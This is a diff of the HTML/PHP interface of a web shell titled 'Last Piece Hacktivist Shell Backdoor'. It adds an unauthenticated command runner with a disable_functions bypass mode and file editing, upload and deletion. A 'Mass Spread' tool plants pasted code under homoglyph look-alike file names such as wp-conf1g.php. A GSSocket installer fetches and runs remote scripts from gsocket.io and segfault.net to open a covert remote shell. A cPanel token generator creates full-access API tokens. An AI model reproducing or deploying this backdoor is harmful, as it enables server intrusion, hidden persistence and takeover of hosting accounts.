-                    <div class="footer-title">Last Piece Hacktivist Shell Backdoor</div>
-                    <div class="footer-version">v1.0.0</div>
-                </div>
-            </div>
-            <div class="footer-credit">
-                Created by <span class="footer-author">Portgas D Ace</span>
-            </div>
-        </div>
-    </footer>
-</div>
-
-<div class="modal-overlay hidden" id="chmodModal">
-    <div class="modal" style="max-width: 450px;">
-        <div class="modal-header">
-            <span class="modal-title">Mass Chmod</span>
-            <button class="modal-close" onclick="hideModal('chmod')">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <line x1="18" y1="6" x2="6" y2="18"/>
-                    <line x1="6" y1="6" x2="18" y2="18"/>
-                </svg>
-            </button>
-        </div>
+<div class="container">
+    <div style="margin-bottom: 12px;">
+        <a href="?lph=<?php echo urlencode(dirname($_GET['edit'])); ?>" class="btn btn-secondary">&larr; Back</a>
+    </div>
+    <div class="cmd-section">
+        <h3 style="color: var(--gold); margin-bottom: 12px;">Editing: <?php echo htmlspecialchars(basename($file)); ?></h3>
+        <?php if (!empty($responseMessage)): ?><div class="msg-success"><?php echo $responseMessage; ?></div><?php endif; ?>
+        <?php if (!empty($errorMessage)): ?><div class="msg-error"><?php echo $errorMessage; ?></div><?php endif; ?>
         <form method="POST">
-            <div class="modal-body">
-                <p style="color: var(--text-muted); font-size: 11px; margin-bottom: 14px;">Change permissions recursively for all folders and files in the target path.</p>
-                
-                <div class="form-group">
-                    <label class="form-label">Target Path</label>
-                    <input type="text" name="chmod_path" class="form-input" value="<?php echo htmlspecialchars($currentDirectory); ?>" style="font-size: 12px;" required>
-                </div>
-                
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
-                    <div class="form-group">
-                        <label class="form-label">Folder Permission</label>
-                        <input type="text" name="chmod_folder" class="form-input" placeholder="0755" value="0755" maxlength="4" pattern="[0-7]{3,4}" style="font-size: 12px;" required>
-                        <span style="font-size: 10px; color: var(--text-muted);">e.g. 0755, 0777, 0750</span>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">File Permission</label>
-                        <input type="text" name="chmod_file" class="form-input" placeholder="0644" value="0644" maxlength="4" pattern="[0-7]{3,4}" style="font-size: 12px;" required>
-                        <span style="font-size: 10px; color: var(--text-muted);">e.g. 0644, 0666, 0600</span>
-                    </div>
-                </div>
-                
-                <div style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.3); border-radius: 6px; padding: 10px; margin-top: 12px;">
-                    <p style="color: var(--gold); font-size: 11px; display: flex; align-items: center; gap: 6px;">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
-                            <line x1="12" y1="9" x2="12" y2="13"/>
-                            <line x1="12" y1="17" x2="12.01" y2="17"/>
-                        </svg>
-                        This will change permissions for ALL files and folders recursively!
-                    </p>
-                </div>
-            </div>
-            <div class="modal-footer">
-                <button type="button" class="btn btn-secondary" onclick="hideModal('chmod')">Cancel</button>
-                <button type="submit" name="mass_chmod" class="btn btn-primary">Apply Chmod</button>
+            <textarea name="content" class="editor-area"><?php echo htmlspecialchars($content ?? ''); ?></textarea>
+            <div style="margin-top: 10px; display: flex; gap: 8px;">
+                <button type="submit" class="btn btn-primary">Save File</button>
+                <a href="?lph=<?php echo urlencode(dirname($file)); ?>" class="btn btn-secondary">Cancel</a>
             </div>
         </form>
     </div>
 </div>
 
+<?php elseif (isset($_GET['rename'])): ?>
+<div class="container">
+    <div class="cmd-section">
+        <h3 style="color: var(--gold); margin-bottom: 12px;">Rename: <?php echo htmlspecialchars(basename($_GET['rename'])); ?></h3>
+        <form method="POST">
+            <div class="form-group">
+                <label class="form-label">New Name</label>
+                <input type="text" name="new_name" class="form-input" value="<?php echo htmlspecialchars(basename($_GET['rename'])); ?>" required>
+            </div>
+            <div style="display: flex; gap: 8px;">
+                <button type="submit" class="btn btn-primary">Rename</button>
+                <a href="?lph=<?php echo urlencode(dirname($_GET['rename'])); ?>" class="btn btn-secondary">Cancel</a>
+            </div>
+        </form>
+    </div>
+</div>
+
+<?php elseif (isset($_GET['chmod'])): ?>
+<div class="container">
+    <div class="cmd-section">
+        <h3 style="color: var(--gold); margin-bottom: 12px;">Chmod: <?php echo htmlspecialchars(basename($_GET['chmod'])); ?></h3>
+        <form method="POST">
+            <div class="form-group">
+                <label class="form-label">Permission</label>
+                <input type="text" name="permission" class="form-input" placeholder="0755" maxlength="4" required>
+            </div>
+            <div style="display: flex; gap: 8px;">
+                <button type="submit" class="btn btn-primary">Change</button>
+                <a href="?lph=<?php echo urlencode(dirname($_GET['chmod'])); ?>" class="btn btn-secondary">Cancel</a>
+            </div>
+        </form>
+    </div>
+</div>
+
+<?php else: ?>
+
+<header class="app-header">
+    <div class="header-left">
+        <img src="https://l.top4top.io/p_3688fo4y41.png" class="header-logo" alt="">
+        <div>
+            <div class="header-title">Last Piece Hacktivist</div>
+            <div class="header-sub">File Manager v1.0</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span class="sys-badge"><?php echo php_uname('s') . ' ' . php_uname('r'); ?></span>
+        <span class="sys-badge"><?php echo @get_current_user(); ?></span>
+        <span class="sys-badge" style="color:#3fb950;">No Auth</span>
+    </div>
+</header>
+
+<div class="container">
+    <?php if (!empty($responseMessage)): ?><div class="msg-success"><?php echo $responseMessage; ?></div><?php endif; ?>
+    <?php if (!empty($errorMessage)): ?><div class="msg-error"><?php echo $errorMessage; ?></div><?php endif; ?>
+
+    <div class="breadcrumb">
+        <strong>DIR:</strong>
+        <?php
+        $bPath = str_replace('\\', '/', $currentDirectory);
+        $parts = explode('/', $bPath);
+        foreach ($parts as $id => $part) {
+            if ($part == '' && $id == 0) {
+                echo ' <a href="?lph=/">/</a>';
+            } elseif (!empty($part)) {
+                $link = implode('/', array_slice($parts, 0, $id + 1));
+                echo ' <a href="?lph=' . urlencode($link) . '">' . htmlspecialchars($part) . '</a> /';
+            }
+        }
+        ?>
+    </div>
+
+    <!-- Toolbar: Features -->
+    <div class="toolbar">
+        <div class="toolbar-label">Features</div>
+        <form method="POST" style="display:contents;">
+            <button type="submit" name="newfolder_btn" class="btn btn-sm" onclick="var n=prompt('Folder name:');if(n){this.form.querySelector('[name=foldername]').value=n;}else{event.preventDefault();}">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
+                New Folder
+            </button>
+            <input type="hidden" name="newfolder" value="1">
+            <input type="hidden" name="foldername" value="">
+        </form>
+        <form method="POST" style="display:contents;">
+            <input type="submit" name="Summon" value="Adminer" class="btn btn-sm">
+        </form>
+        <form method="POST" enctype="multipart/form-data" style="display:contents;">
+            <label class="upload-label">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+                Upload
+                <input type="file" name="file" onchange="this.form.submit()">
+            </label>
+            <input type="hidden" name="upload" value="1">
+        </form>
+        <button onclick="showModal('multiupload')" class="btn btn-sm">Multi Upload</button>
+        <button onclick="showModal('remote')" class="btn btn-sm">Remote Upload</button>
+    </div>
+
+    <!-- Toolbar: Scanner -->
+    <div class="toolbar">
+        <div class="toolbar-label">Scanner</div>
+        <form method="POST" style="display:contents;">
+            <button type="submit" name="scan_deeply" class="btn btn-scan btn-sm">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
+                Deep Scan
+            </button>
+        </form>
+        <form method="POST" style="display:contents;">
+            <input type="hidden" name="scan_ext" value="php">
+            <button type="submit" name="scan_newly" class="btn btn-scan btn-sm">New PHP Files</button>
+        </form>
+        <button onclick="showModal('chmod')" class="btn btn-chmod btn-sm">Mass Chmod</button>
+        <button onclick="showModal('spread')" class="btn btn-spread btn-sm">Mass Spread</button>
+    </div>
+
+    <!-- Toolbar: Tools -->
+    <div class="toolbar">
+        <div class="toolbar-label">Tools</div>
+        <button onclick="showModal('gsocket')" class="btn btn-gs btn-sm">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
+            GSSocket
+        </button>
+        <button onclick="showModal('uapi')" class="btn btn-uapi btn-sm">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
+            UAPI
+        </button>
+        <button onclick="showModal('ftp')" class="btn btn-ftp btn-sm">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
+            FTP Manager
+        </button>
+        <?php if ($wpAvailable): ?>
+        <button onclick="showModal('wp')" class="btn btn-wp btn-sm">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+            WordPress
+        </button>
+        <?php endif; ?>
+        <button onclick="showModal('proc')" class="btn btn-proc btn-sm">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/><line x1="9" y1="15" x2="9.01" y2="15"/><line x1="15" y1="15" x2="15.01" y2="15"/></svg>
+            Process
+        </button>
+    </div>
+
+    <!-- Command -->
+    <div class="cmd-section">
+        <form method="POST" id="cmdForm">
+            <input type="hidden" name="use_bypass" id="useBypassField" value="0">
+            <div class="cmd-prompt">
+                <span class="cmd-user"><?php echo @get_current_user() . '@' . @gethostname(); ?></span>
+                <span class="cmd-dollar" id="cmdModeLabel">$</span>
+                <input type="text" name="cmd" placeholder="Enter command..." autofocus>
+                <button type="submit" class="btn btn-sm btn-primary">Run</button>
+                <button type="button" id="bypassToggle" class="btn btn-sm btn-secondary" onclick="toggleBypass()" title="Toggle Bypass Mode" style="padding: 4px 8px; font-size: 10px; min-width: 52px;">Normal</button>
+            </div>
+        </form>
+        <?php
+        $disabledFuncs = @ini_get('disable_functions');
+        $execAvailable = !$disabledFuncs || (
+            stripos($disabledFuncs, 'exec') === false &&
+            stripos($disabledFuncs, 'shell_exec') === false &&
+            stripos($disabledFuncs, 'proc_open') === false &&
+            stripos($disabledFuncs, 'system') === false
+        );
+        ?>
+        <div style="display: flex; gap: 8px; align-items: center; margin-top: 6px; padding: 0 8px;">
+            <span style="font-size: 10px; color: var(--text-muted);">Exec:</span>
+            <span style="font-size: 10px; color: <?php echo $execAvailable ? '#3fb950' : '#f85149'; ?>;"><?php echo $execAvailable ? 'Available' : 'Disabled'; ?></span>
+            <span style="font-size: 10px; color: var(--text-muted);">|</span>
+            <span style="font-size: 10px; color: var(--text-muted);">Bypass:</span>
+            <span style="font-size: 10px; color: #00d4ff;">UAF PHP <?php echo PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION; ?></span>
+            <span style="font-size: 10px; color: var(--text-muted);">|</span>
+            <span style="font-size: 10px; color: var(--text-muted);">Disabled:</span>
+            <span style="font-size: 10px; color: #f97316; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="<?php echo htmlspecialchars($disabledFuncs); ?>"><?php echo $disabledFuncs ? htmlspecialchars(substr($disabledFuncs, 0, 60)) . (strlen($disabledFuncs) > 60 ? '...' : '') : 'None'; ?></span>
+        </div>
+        <?php if (!empty($cmdOutput)): ?>
+        <div class="cmd-output"><pre><?php echo htmlspecialchars($cmdOutput); ?></pre></div>
+        <?php endif; ?>
+    </div>
+
+    <!-- File Table -->
+    <table class="file-table">
+        <tr>
+            <th>Name</th>
+            <th>Type</th>
+            <th>Size</th>
+            <th>Permission</th>
+            <th>Actions</th>
+        </tr>
+        <?php
+        $fileDetails = getFileDetails($currentDirectory);
+        if (is_array($fileDetails)):
+            foreach ($fileDetails as $fd):
+                $fullPath = $currentDirectory . '/' . $fd['name'];
+        ?>
+        <tr>
+            <td>
+                <span class="file-icon">
+                    <?php if ($fd['type'] === 'Folder'): ?>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="var(--gold)" stroke="var(--gold)" stroke-width="1"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
+                    <a href="?lph=<?php echo urlencode($fullPath); ?>" style="color: var(--gold);"><?php echo htmlspecialchars($fd['name']); ?></a>
+                    <?php else: ?>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#e6edf3" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+                    <a href="?edit=<?php echo urlencode($fullPath); ?>" style="color: #e6edf3;"><?php echo htmlspecialchars($fd['name']); ?></a>
+                    <?php endif; ?>
+                </span>
+            </td>
+            <td style="color: #00d4ff;"><?php echo $fd['type']; ?></td>
+            <td><?php echo $fd['size']; ?></td>
+            <td style="color: <?php echo $fd['perm_color']; ?>; font-family: monospace; font-weight: 600;"><?php echo $fd['permission']; ?></td>
+            <td>
+                <div class="action-btns">
+                    <?php if ($fd['type'] === 'File'): ?>
+                    <a href="?edit=<?php echo urlencode($fullPath); ?>">Edit</a>
+                    <?php endif; ?>
+                    <a href="?rename=<?php echo urlencode($fullPath); ?>">Rename</a>
+                    <a href="?chmod=<?php echo urlencode($fullPath); ?>">Chmod</a>
+                    <a href="javascript:void(0)" class="act-del" onclick="showDeleteConfirm('<?php echo urlencode($fullPath); ?>','<?php echo htmlspecialchars($fd['name']); ?>')">Delete</a>
+                </div>
+            </td>
+        </tr>
+        <?php endforeach; else: ?>
+        <tr><td colspan="5" style="color:var(--text-muted);">No files or folders found.</td></tr>
+        <?php endif; ?>
+    </table>
+</div>
+
+<footer class="app-footer">
+    <div class="footer-content">
+        <img src="https://i.top4top.io/p_3332p3mbq1.jpg" class="footer-avatar" alt="">
+        <div class="footer-text"><span>Last Piece Hacktivist</span> Shell Backdoor v1.0.0</div>
+    </div>
+</footer>
+
+<!-- Delete Confirm Modal -->
+<div class="modal-overlay hidden" id="deleteConfirmModal">
+    <div class="modal" style="max-width: 400px;">
+        <div class="modal-header" style="border-bottom-color: rgba(248, 81, 73, 0.3);">
+            <span class="modal-title" style="color: var(--red);">Delete Confirmation</span>
+            <button class="modal-close" onclick="hideDeleteConfirm()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+        </div>
+        <div class="modal-body" style="text-align: center; padding: 24px;">
+            <div style="width: 60px; height: 60px; background: rgba(248, 81, 73, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+            </div>
+            <p style="color: var(--text); font-size: 14px; margin-bottom: 8px;">Are you sure?</p>
+            <p id="deleteFileName" style="color: var(--gold); font-size: 13px; font-weight: 600; word-break: break-all;"></p>
+            <p style="color: var(--text-muted); font-size: 11px; margin-top: 12px;">This action cannot be undone.</p>
+        </div>
+        <div class="modal-footer" style="justify-content: center; gap: 12px;">
+            <button type="button" class="btn btn-secondary" onclick="hideDeleteConfirm()">Cancel</button>
+            <a id="deleteConfirmBtn" href="#" class="btn btn-danger" style="background: var(--red); color: white;">Delete</a>
+        </div>
+    </div>
+</div>
+
+<!-- Mass Chmod Modal -->
+<div class="modal-overlay hidden" id="chmodModal">
+    <div class="modal" style="max-width: 450px;">
+        <div class="modal-header">
+            <span class="modal-title">Mass Chmod</span>
+            <button class="modal-close" onclick="hideModal('chmod')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+        </div>
+        <form method="POST">
+            <div class="modal-body">
+                <div class="form-group">
+                    <label class="form-label">Target Path</label>
+                    <input type="text" name="chmod_path" class="form-input" value="<?php echo htmlspecialchars($currentDirectory); ?>" required>
+                </div>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+                    <div class="form-group">
+                        <label class="form-label">Folder Permission</label>
+                        <input type="text" name="chmod_folder" class="form-input" placeholder="0755" value="0755" maxlength="4" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">File Permission</label>
+                        <input type="text" name="chmod_file" class="form-input" placeholder="0644" value="0644" maxlength="4" required>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" onclick="hideModal('chmod')">Cancel</button>
+                <button type="submit" name="mass_chmod" class="btn btn-primary">Apply</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Mass Spread Modal -->
+<div class="modal-overlay hidden" id="spreadModal">
+    <div class="modal" style="max-width: 550px;">
+        <div class="modal-header">
+            <span class="modal-title">Mass Spread (Auto-Match)</span>
+            <button class="modal-close" onclick="hideModal('spread')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+        </div>
+        <form method="POST">
+            <div class="modal-body">
+                <div style="background: rgba(0, 212, 255, 0.08); border: 1px solid rgba(0, 212, 255, 0.2); border-radius: 6px; padding: 12px; margin-bottom: 14px;">
+                    <p style="color: var(--accent); font-size: 11px; font-weight: 600; margin-bottom: 6px;">Auto-Match Filename</p>
+                    <p style="color: var(--text-muted); font-size: 10px; line-height: 1.5;">Scans each folder for existing PHP files and creates a homoglyph variant automatically. Example: <span style="color:var(--gold);">wp-config.php</span> becomes <span style="color:var(--green);">wp-conf1g.php</span> or <span style="color:var(--green);">wp-c0nfig.php</span></p>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Paste Code</label>
+                    <textarea name="spread_content" class="form-input" style="min-height: 200px; resize: vertical; font-family: monospace;" placeholder="Paste your code here..." required></textarea>
+                </div>
+                <div style="background: rgba(248, 81, 73, 0.1); border: 1px solid rgba(248, 81, 73, 0.3); border-radius: 6px; padding: 10px;">
+                    <p style="color: var(--red); font-size: 11px;">Recursive from: <?php echo htmlspecialchars($currentDirectory); ?></p>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" onclick="hideModal('spread')">Cancel</button>
+                <button type="submit" name="mass_spread" class="btn btn-primary">Spread All</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Multi Upload Modal -->
 <div class="modal-overlay hidden" id="multiuploadModal">
     <div class="modal" style="max-width: 550px;">
         <div class="modal-header">
             <span class="modal-title">Multi Upload</span>
-            <button class="modal-close" onclick="hideModal('multiupload')">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <line x1="18" y1="6" x2="6" y2="18"/>
-                    <line x1="6" y1="6" x2="18" y2="18"/>
-                </svg>
-            </button>
+            <button class="modal-close" onclick="hideModal('multiupload')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
-        <form method="POST" enctype="multipart/form-data" id="multiUploadForm">
+        <form method="POST" enctype="multipart/form-data">
             <div class="modal-body">
-                <p style="color: var(--text-muted); font-size: 12px; margin-bottom: 12px;">Select multiple files from different uploaders, then click Upload All.</p>
                 <div id="uploadersContainer">
                     <div class="uploader-row">
                         <label class="custom-file-input">
                             <input type="file" name="files[]" onchange="updateFileName(this)">
-                            <span class="file-btn">
-                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
-                                    <polyline points="17 8 12 3 7 8"/>
-                                    <line x1="12" y1="3" x2="12" y2="15"/>
-                                </svg>
-                                Choose File
-                            </span>
+                            <span class="file-btn">Choose File</span>
                             <span class="file-name">No file selected</span>
                         </label>
-                        <button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)" style="padding: 6px 10px;">X</button>
+                        <button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)">X</button>
                     </div>
                 </div>
-                <button type="button" class="btn btn-secondary btn-sm" onclick="addUploader()" style="margin-top: 10px; width: 100%;">
-                    + Add More File
-                </button>
+                <button type="button" class="btn btn-secondary btn-sm" onclick="addUploader()" style="margin-top: 10px; width: 100%;">+ Add More</button>
             </div>
             <div class="modal-footer">
                 <button type="button" class="btn btn-secondary" onclick="hideModal('multiupload')">Cancel</button>
@@ -2360,26 +2054,22 @@ if (isAuthenticated()) {
     </div>
 </div>
 
+<!-- Remote Upload Modal -->
 <div class="modal-overlay hidden" id="remoteModal">
-    <div class="modal" style="max-width: 500px;">
+    <div class="modal" style="max-width: 450px;">
         <div class="modal-header">
             <span class="modal-title">Remote Upload</span>
-            <button class="modal-close" onclick="hideModal('remote')">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <line x1="18" y1="6" x2="6" y2="18"/>
-                    <line x1="6" y1="6" x2="18" y2="18"/>
-                </svg>
-            </button>
+            <button class="modal-close" onclick="hideModal('remote')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
         <form method="POST">
             <div class="modal-body">
                 <div class="form-group">
-                    <label class="form-label">Raw URL</label>
-                    <input type="url" name="remote_url" class="form-input" placeholder="https://example.com/file.php" required>
+                    <label class="form-label">URL</label>
+                    <input type="text" name="remote_url" class="form-input" placeholder="https://example.com/file.php" required>
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Save As (filename)</label>
-                    <input type="text" name="remote_filename" class="form-input" placeholder="myfile.php" required>
+                    <label class="form-label">Save as (optional)</label>
+                    <input type="text" name="remote_filename" class="form-input" placeholder="Leave empty for original name">
                 </div>
             </div>
             <div class="modal-footer">
@@ -2390,273 +2080,785 @@ if (isAuthenticated()) {
     </div>
 </div>
 
-<div class="modal-overlay hidden" id="newfileModal">
-    <div class="modal">
-        <div class="modal-header">
-            <span class="modal-title">Create New File</span>
-            <button class="modal-close" onclick="hideModal('newfile')">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <line x1="18" y1="6" x2="6" y2="18"/>
-                    <line x1="6" y1="6" x2="18" y2="18"/>
-                </svg>
-            </button>
-        </div>
-        <form method="POST">
-            <div class="modal-body">
-                <div class="form-group">
-                    <label class="form-label">File Name</label>
-                    <input type="text" name="filename" class="form-input" placeholder="example.php" required>
-                </div>
-            </div>
-            <div class="modal-footer">
-                <button type="button" class="btn btn-secondary" onclick="hideModal('newfile')">Cancel</button>
-                <button type="submit" name="newfile" class="btn btn-primary">Create</button>
-            </div>
-        </form>
-    </div>
-</div>
-
-<div class="modal-overlay hidden" id="newfolderModal">
-    <div class="modal">
-        <div class="modal-header">
-            <span class="modal-title">Create New Folder</span>
-            <button class="modal-close" onclick="hideModal('newfolder')">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <line x1="18" y1="6" x2="6" y2="18"/>
-                    <line x1="6" y1="6" x2="18" y2="18"/>
-                </svg>
-            </button>
-        </div>
-        <form method="POST">
-            <div class="modal-body">
-                <div class="form-group">
-                    <label class="form-label">Folder Name</label>
-                    <input type="text" name="foldername" class="form-input" placeholder="new-folder" required>
-                </div>
-            </div>
-            <div class="modal-footer">
-                <button type="button" class="btn btn-secondary" onclick="hideModal('newfolder')">Cancel</button>
-                <button type="submit" name="newfolder" class="btn btn-primary">Create</button>
-            </div>
-        </form>
-    </div>
-</div>
-
+<!-- GSSocket Modal -->
 <div class="modal-overlay hidden" id="gsocketModal">
     <div class="modal" style="max-width: 500px;">
         <div class="modal-header">
-            <span class="modal-title">GSocket Installer</span>
-            <button class="modal-close" onclick="hideModal('gsocket')">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <line x1="18" y1="6" x2="6" y2="18"/>
-                    <line x1="6" y1="6" x2="18" y2="18"/>
-                </svg>
-            </button>
+            <span class="modal-title" style="color: #10b981;">GSSocket Manager</span>
+            <button class="modal-close" onclick="hideModal('gsocket')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
         <div class="modal-body">
-            <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">
-                GSocket allows you to establish encrypted connections. Choose an action below:
-            </p>
-            <div style="display: flex; flex-direction: column; gap: 10px;">
-                <div style="background: var(--bg-input); border: 1px solid var(--border); border-radius: 8px; padding: 14px;">
-                    <div style="font-weight: 600; color: var(--accent); margin-bottom: 8px; font-size: 13px;">Install with cURL</div>
-                    <form method="POST" style="display: flex; gap: 8px;">
-                        <input type="hidden" name="gsocket_cmd" value="install_curl">
-                        <button type="submit" name="gsocket_action" class="btn btn-primary btn-sm" style="flex: 1;">Install</button>
-                    </form>
+            <div style="background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.2); border-radius: 6px; padding: 12px; margin-bottom: 16px;">
+                <p style="color: #10b981; font-size: 11px; font-weight: 600; margin-bottom: 4px;">GSSocket Auto-Install Chain</p>
+                <p style="color: var(--text-muted); font-size: 10px; line-height: 1.5;">
+                    1. gsocket.io/y (curl/wget)<br>
+                    2. segfault.net/deploy-all.sh<br>
+                    3. GS_PORT=53 deploy-all.sh
+                </p>
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <form method="POST" style="flex: 1;">
+                    <input type="hidden" name="gsocket_action" value="1">
+                    <input type="hidden" name="gsocket_cmd" value="install">
+                    <button type="submit" class="btn btn-gs" style="width: 100%; padding: 10px;">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                        Install
+                    </button>
+                </form>
+                <form method="POST" style="flex: 1;">
+                    <input type="hidden" name="gsocket_action" value="1">
+                    <input type="hidden" name="gsocket_cmd" value="uninstall">
+                    <button type="submit" class="btn btn-danger" style="width: 100%; padding: 10px;">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
+                        Uninstall
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- UAPI Modal -->
+<div class="modal-overlay hidden" id="uapiModal">
+    <div class="modal" style="max-width: 520px;">
+        <div class="modal-header">
+            <span class="modal-title" style="color: #8b5cf6;">UAPI / cPanel Manager</span>
+            <button class="modal-close" onclick="hideModal('uapi')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+        </div>
+        <div class="modal-body">
+            <p style="color: var(--text-muted); font-size: 11px; font-weight: 600; margin-bottom: 10px;">Generate cPanel API Token</p>
+            <form method="POST" style="margin-bottom: 20px;">
+                <button type="submit" name="cpanel_token" class="btn btn-uapi" style="width: 100%;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                    Generate Token
+                </button>
+                <span style="font-size: 10px; color: var(--text-muted);">Creates a full-access API token for cPanel.</span>
+            </form>
+            <div style="border-top: 1px solid var(--border); padding-top: 16px;">
